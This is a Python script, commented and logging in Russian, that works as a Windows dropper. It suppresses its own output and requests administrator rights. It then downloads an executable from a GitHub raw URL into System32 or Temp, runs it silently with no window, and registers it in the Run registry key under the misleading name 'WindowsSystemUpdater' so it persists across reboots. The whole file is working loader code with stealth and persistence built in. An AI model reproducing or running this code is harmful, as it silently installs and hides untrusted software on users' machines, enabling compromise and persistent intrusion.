import urllib.request
import os
import subprocess
import winreg
import tempfile
import logging
import sys
import ctypes
from pathlib import Path

# Определяем папку запуска скрипта
SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
LOG_FILE = os.path.join(SCRIPT_DIR, "update_log.txt")

# Настройка логирования в файл рядом со скриптом
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg):
    """Запись итогового отчета в файл"""
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write("\n--- ИТОГОВЫЙ ОТЧЕТ ---\n")
        f.write(f"Скачивание: {'успешно' if dl_ok else 'провал'} причина: {dl_msg if not dl_ok else 'N/A'}\n")
        f.write(f"Запуск: {'успешно' if run_ok else 'провал'} причина: {run_msg if not run_ok else 'N/A'}\n")
        f.write(f"Автозагрузка: {'успешно' if auto_ok else 'провал'} причина: {auto_msg if not auto_ok else 'N/A'}\n")
        f.write("--- КОНЕЦ ОТЧЕТА ---\n")

def download_file(url, dest):
    try:
        urllib.request.urlretrieve(url, dest)
        if os.path.exists(dest) and os.path.getsize(dest) > 0:
            logging.info("Скачивание: успешно")
            return True, "успешно"
        else:
            msg = "файл пуст или отсутствует"
            logging.error(f"Скачивание: провал - {msg}")
            return False, msg
    except Exception as e:
        msg = str(e)
        logging.error(f"Скачивание: провал - {msg}")
        return False, msg

def run_exe_silent(path):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen(
            [path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False
        )
        logging.info("Запуск: успешно")
        return True, "успешно"
    except Exception as e:
        msg = str(e)
        logging.error(f"Запуск: провал - {msg}")
        return False, msg

def add_to_autorun(key_name, exe_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        logging.info("Автозагрузка: успешно")
        return True, "успешно"
    except Exception as e:
        msg = str(e)
        logging.error(f"Автозагрузка: провал - {msg}")
        return False, msg

def main():
    # Подавление вывода в консоль
    sys.stderr = open(os.devnull, 'w')
    sys.stdout = open(os.devnull, 'w')
    
    url = "https://github.com/s1cr3TtT/test/raw/main/ZCode-3.1.2-win-x64.exe"
    target_dir = r"C:\Windows\System32"
    target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
    reg_name = "WindowsSystemUpdater"
    
    # Попытка запроса админ-прав
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0
            )
            sys.exit(0)
        except:
            target_dir = tempfile.gettempdir()
            target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
            logging.warning("Админ прав нет, используется Temp")
    
    # 1. Скачивание
    dl_ok, dl_msg = download_file(url, target_exe)
    if not dl_ok:
        logging.info(f"Скачивание: провал причина: {dl_msg}")
        write_final_log(dl_ok, dl_msg, False, "не выполнялся", False, "не выполнялся")
        return
    
    # 2. Запуск
    run_ok, run_msg = run_exe_silent(target_exe)
    if not run_ok:
        logging.info(f"Запуск: провал причина: {run_msg}")
    
    # 3. Автозагрузка
    auto_ok, auto_msg = add_to_autorun(reg_name, target_exe)
    if not auto_ok:
        logging.info(f"Автозагрузка: провал причина: {auto_msg}")
    
    # Запись итогового отчета
    write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg)

if __name__ == "__main__":
    main()
